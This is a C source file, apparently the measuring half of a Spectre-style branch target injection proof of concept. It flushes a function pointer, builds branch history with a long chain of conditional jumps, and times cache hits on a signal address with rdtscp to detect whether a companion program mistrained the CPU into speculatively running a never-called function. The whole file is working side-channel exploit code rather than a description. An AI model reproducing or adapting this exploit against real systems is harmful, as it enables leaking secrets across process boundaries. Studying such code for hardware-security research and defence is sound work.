#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <x86intrin.h>
#include <unistd.h>
#include <string.h>



//void funcfoo(void) __attribute__((section(".funcfoo")));
//void funcbar(void) __attribute__((section(".funcbar")));

unsigned int junk=0;

// Put this in its own (4KB) page
//uint8_t probe_buf[4096*256*1024];
uint8_t *probe_buf;


uint8_t *signal_ptr;   // Point to some cache-aligned memory surrounded by...nothing

uint8_t stack_probe_buf[1024*1024*256];

// Keep stats
uint64_t cache_hits = 0;    // Basically number of times target_fn was speculatively executed
uint64_t tot_runs = 0;
uint64_t tot_time = 0;

/*
 * This function is NEVER CALLED in measure.c
 * but if it is speculatively executed,
 * (because of a sucessful mistrain by inject.c)
 * then we'll load probe_buf[100] into cache
 */
void target_fn(void) __attribute__((section(".targetfn")));
void target_fn(void) {
    asm volatile ( "movb (%%rbx), %%al\n" :: "b"((uint8_t*)signal_ptr) : "rax");
    //asm volatile( "nop");
    //asm volatile ( "movb (%%rbx), %%al\n" :: "b"(&probe_buf[1200]) : "rax");


}



void test() {
    uint64_t t0, t1;
    uint8_t *addr = signal_ptr;
    t0 = _rdtscp(&junk);
    asm volatile( "movb (%%rbx), %%al\n"
            :: "b"(addr) : "rax");
    t1 = _rdtscp(&junk);
    if (t1-t0 < 140) {
        cache_hits++;
        tot_time += t1-t0;
        //printf("# %lu\n", t1-t0);
    }
    tot_runs++;

    // Clear probe_buf from cache
    int i;

    for (i=0; i<256; i++) {
        //_mm_clflush(&probe_buf[i*1024*1024]);
    }
    _mm_clflush(signal_ptr);
    //_mm_clflush(&probe_buf[100*1024*1024]);
}

void __attribute__((section(".fnptr"))) (*fn_ptr)(void); // we'll set this = test, and cflush it
uint64_t jmp_ptr;

// Place this at the address of the function that will be doing an indirect call
// (measure)
void indirect(void) __attribute__((section(".indirect")));
void indirect(void) {
    // do our indirect jump
    // 16 taken (conditional?) branches...
    // HACK: relative jmp is 2 bytes (74 00 is "je foo\nfoo:")
    // If you want these to all be taken, set rax=0x11
    // otherwise there will be 16 not-taken branches
    asm volatile (
            "cmpb  $0x02, %%al\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "mov (%%rbx), %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            :: "a"(0x02), "b"(&jmp_ptr) : "rcx");


    // Do indirect jump
    (*fn_ptr)();
}


void measure() {
    fn_ptr = test;
    jmp_ptr = 0x400b5d; //400a5d
    int i;
    while (1) {
        for (i=0; i<100000; i++) {
            _mm_clflush(fn_ptr);
            _mm_clflush(&jmp_ptr);
            indirect();
            //usleep(100);
        }
        uint64_t avg = 0;
        if (cache_hits > 0) avg = tot_time/cache_hits;
        printf("%lu / %lu = %0.5f%% hits, %lu avg ns\n", cache_hits, tot_runs, 100*((float)cache_hits)/tot_runs, avg);
        cache_hits = 0;
        tot_runs = 0;
        tot_time = 0;
        usleep(10);
    }


}

void funcbar() {
    printf("hello from funcbar\n");
}

int main()
{
    probe_buf = malloc(1024*1024*256);
    if (probe_buf == NULL) {
        perror("malloc");
        return -1;
    }

    printf("probe_buf @%p\n", probe_buf);
    int i =0;
    for (i=0; i<256; i++) {
        memset(&probe_buf[i*1024*1024], i, 1024*1024);
        memset(&stack_probe_buf[i*1024*1024], i, 1024*1024);
        _mm_clflush(&probe_buf[i*1024*1024]);
        _mm_clflush(&stack_probe_buf[i*1024*1024]);
    }

    signal_ptr = (uint8_t*)(((uint64_t)(stack_probe_buf + 1024*1024*100)) & ~63);
    printf("probe_buf[.]: %p\n", &probe_buf[1024*1024*100]);
    printf("signal_ptr:   %p\n", signal_ptr);



    fn_ptr = test;
    printf("test() @ %p\n", test);
    printf("indirect jump ptr = %p\n", fn_ptr);
    printf("indirect fn = %p\n", indirect);

    printf("target_fn = %p\n", target_fn);

    printf("measuring...\n");

    measure();

    printf("[+] Success!\n");

    //funcfoo();
    //funcbar();
}
